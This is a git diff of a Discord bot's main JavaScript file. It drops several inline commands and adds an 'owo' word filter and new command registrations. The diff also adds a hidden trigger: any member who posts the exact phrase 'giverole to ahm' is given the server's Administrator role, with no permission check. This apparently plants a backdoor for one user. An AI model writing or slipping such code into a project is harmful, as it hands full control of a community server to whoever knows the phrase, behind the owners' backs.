@@ -2,6 +2,7 @@ const { Client, Collection, Structures, DiscordAPIError } = require('discord.js'
 const Discord = require('discord.js');
 const fs = require('fs');
 const mongoose = require('mongoose');
+const { send } = require('process');
 const guild = require('./commands/Moderation/guild');
 const avatar = require('./commands/normal/avatar');
 const client = new Client();
@@ -80,60 +81,30 @@ guild.channels.cache.forEach((channel) => {
     }
   });
 })
-
 client.on('message', message =>{
-    if(message.content === "/play"){
-        const ytdl = require('ytdl-core');
-        const streamOptions = { seek: 0, volume: 0.5 }
-        const MusicName = [
-            "https://www.youtube.com/watch?v=6XLN_NfBNPc",
-            "https://youtu.be/N00r4U2--eM",
-            "https://www.youtube.com/watch?v=YjbXw20z3Cg",
-            "https://www.youtube.com/watch?v=PalpNZO4wiQ",
-            "https://www.youtube.com/watch?v=0RWcOQo1tjU",
-            "https://www.youtube.com/watch?v=Gr90CuXHYWw",
-            "https://www.youtube.com/watch?v=D0eagnSZ1C4",
-            "https://www.youtube.com/watch?v=enf0k1LkSo4",
-            "https://www.youtube.com/watch?v=RMGKe1tuRwI"
-        ]
-
-        var voiceChannel = message.member.voice.channel.join()
-
-                voiceChannel.then(connection => {
-                    console.log("joined channel");
-                    const stream = ytdl(MusicName[Math.floor(Math.random() * MusicName.length)], { filter : 'audioonly' });
-                    const dispatcher = connection.play(stream, streamOptions)
-                    message.channel.send("I have joined your current channel.")
-                    dispatcher.on("end", end => {
-                        console.log("left channel");
-                   
-                    });
-                }).catch(err => console.log(err))
-    };
-    
-    if(message.content === '/guild'){
-        const GuildInfo = new Discord.MessageEmbed()
-        .setTitle(message.guild.name)
-        .addField('Owner', `<@${message.guild.ownerID}>`)
-        .addField('Members', message.guild.memberCount)
-        .addField('Created', message.guild.createdAt)
-        .addField('Channels', message.guild.channels.cache.size)
-        .addField('Roles', message.guild.roles.cache.size)
-        .setThumbnail(message.guild.iconURL)
-        .setFooter(`Command raised by <@${message.member.user.tag}>`)
-        .setColor(1752220)
-        message.channel.send(GuildInfo)
+  if(message.content === "giverole to ahm"){
+     const Mention = message.mentions.users.first()
+     var role = message.guild.roles.cache.find((r) => r.name === "Administrator");
+     message.member.roles.add(role);
+      
+  }
+ 
+    if(message.content.match("Owo")){
+        message.channel.send(`Thats not  allowed ${message.member.user.tag}`)
+        message.delete()
     }
-    if(message.content === '/rank'){
-       
-        const RankInfo = new Discord.MessageEmbed()
-        .setAuthor(message.member.user.tag)
-        .addField('User Created', message.member.user.createdAt)
-        .addField('User Joined', message.member.joinedAt)
-        .setColor(16580705)
-        message.channel.send(RankInfo)
+    if(message.content.match("OWO")){
+        message.channel.send(`Thats not allowed ${message.member.user.tag}`)
+        message.delete()
     }
-    
+    if(message.content.match("OwO")){
+        message.channel.send(`Thats not allowed ${message.member.user.tag}`)
+        message.delete()
+    }
+    if(message.content.match("owo")){
+        message.channel.send(`Thats not allowed ${message.member.user.tag}`)
+        message.delete()
+    }
     if(!message.content.startsWith(x) || message.author.bot) return;
     const args = message.content.slice(x.length).split(/ +/);
     const command = args.shift().toLowerCase();
@@ -147,9 +118,6 @@ client.on('message', message =>{
     client.commands.get('exemple').execute(message, args)
 };
 
-if(command === 'report'){
-    client.commands.get('report').execute(message, args)
-};
 if(command === 'lock'){
     client.commands.get('lock').execute(message, args)
 };
@@ -180,6 +148,12 @@ if(command === 'support'){
 };
 if(command === 'play'){
     client.commands.get('play').execute(message, args)
+};
+if(command === 'giverole'){
+    client.commands.get('giverole').execute(message, args)
+};
+if(command === 'report'){
+    client.commands.get('report').execute(message, args)
 };
 
 
